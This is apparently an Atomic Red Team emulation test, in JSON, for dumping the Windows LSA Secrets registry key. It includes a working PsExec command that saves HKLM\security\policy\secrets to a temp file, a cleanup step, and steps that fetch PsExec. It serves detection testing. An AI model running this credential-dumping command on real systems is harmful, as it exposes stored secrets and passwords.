{
  "id": "55295ab0-a703-433b-9ca4-ae13807de12f",
  "name": "Dumping LSA Secrets",
  "description": "Dump secrets key from Windows registry\nWhen successful, the dumped file will be written to $env:Temp\\secrets.\nAttackers may use the secrets key to assist with extracting passwords and enumerating other sensitive system information.\nhttps://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/#:~:text=LSA%20Secrets%20is%20a%20registry,host%2C%20local%20security%20policy%20etc.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "07346540-fe47-4f75-937b-c2166dd90e0b",
      "type": "execute-command",
      "data": {
        "command": "\"#{psexec_exe}\" -accepteula -s reg save HKLM\\security\\policy\\secrets %temp%\\secrets /y\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "6bfebad5-ae38-4792-b88e-54499814b53b",
      "type": "execute-command",
      "data": {
        "command": "del %temp%\\secrets \u003enul 2\u003e nul",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "5ea83539-baf2-469b-8883-1e20a003113f",
      "name": "Check dependency 1/1",
      "description": "PsExec from Sysinternals must exist on disk at specified location (#{psexec_exe})",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{psexec_exe}\") {exit 0} else {exit 1}",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "5cb5890a-4f7e-4acc-80d8-6c150155df02",
      "name": "Resolve dependency 1/1",
      "description": "PsExec from Sysinternals must exist on disk at specified location (#{psexec_exe})",
      "type": "execute-command",
      "data": {
        "command": "Invoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PSTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PSTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PSTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{psexec_exe}\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PSTools\\PsExec.exe\" \"#{psexec_exe}\" -Force",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "02e03d02-f0dd-4b62-b007-efe8a575e2e8",
      "name": "Re-check dependency 1/1",
      "description": "PsExec from Sysinternals must exist on disk at specified location (#{psexec_exe})",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{psexec_exe}\") {exit 0} else {exit 1}",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "07346540-fe47-4f75-937b-c2166dd90e0b",
      "p": "on-success",
      "o": "6bfebad5-ae38-4792-b88e-54499814b53b"
    },
    {
      "s": "07346540-fe47-4f75-937b-c2166dd90e0b",
      "p": "on-failure",
      "o": "6bfebad5-ae38-4792-b88e-54499814b53b"
    },
    {
      "s": "5ea83539-baf2-469b-8883-1e20a003113f",
      "p": "on-success",
      "o": "07346540-fe47-4f75-937b-c2166dd90e0b"
    },
    {
      "s": "5ea83539-baf2-469b-8883-1e20a003113f",
      "p": "on-failure",
      "o": "5cb5890a-4f7e-4acc-80d8-6c150155df02"
    },
    {
      "s": "5cb5890a-4f7e-4acc-80d8-6c150155df02",
      "p": "on-success",
      "o": "02e03d02-f0dd-4b62-b007-efe8a575e2e8"
    },
    {
      "s": "02e03d02-f0dd-4b62-b007-efe8a575e2e8",
      "p": "on-failure",
      "o": "07346540-fe47-4f75-937b-c2166dd90e0b"
    }
  ],
  "tags": [
    "T1003.004",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "psexec_exe",
      "type": "path",
      "description": "Path to PsExec executable",
      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1003.004\\bin\\PsExec.exe"
    }
  ]
}